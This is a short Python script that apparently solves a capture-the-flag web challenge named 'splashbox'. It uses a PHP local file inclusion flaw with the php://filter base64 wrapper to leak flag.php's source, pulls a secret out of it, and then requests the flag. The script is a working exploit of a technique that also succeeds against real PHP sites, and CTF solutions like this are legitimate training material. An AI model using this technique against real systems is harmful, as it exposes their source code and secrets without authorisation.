import requests, base64
from bs4 import BeautifulSoup

# by sending this, the require_once function encodes the flag.php file in base64 and then appends it to the page
url = "http://splashbox.challs.olicyber.it/?page=php://filter/convert.base64-encode/resource=flag"

soup = BeautifulSoup(requests.get(url).text, "html.parser")
enc = soup.find("div", {"class": "starter-template"}).text.strip()

decoded = base64.b64decode(enc).decode("utf-8")
print(decoded)

secret = decoded[decoded.find("=== ") + 5: decoded.find("\")")]
print(f'{secret=}')

soup = BeautifulSoup(requests.get('http://splashbox.challs.olicyber.it/?page=flag&secret=' + secret).text, "html.parser")
flag = soup.find("div", {"class": "starter-template"}).text.strip()
print(flag)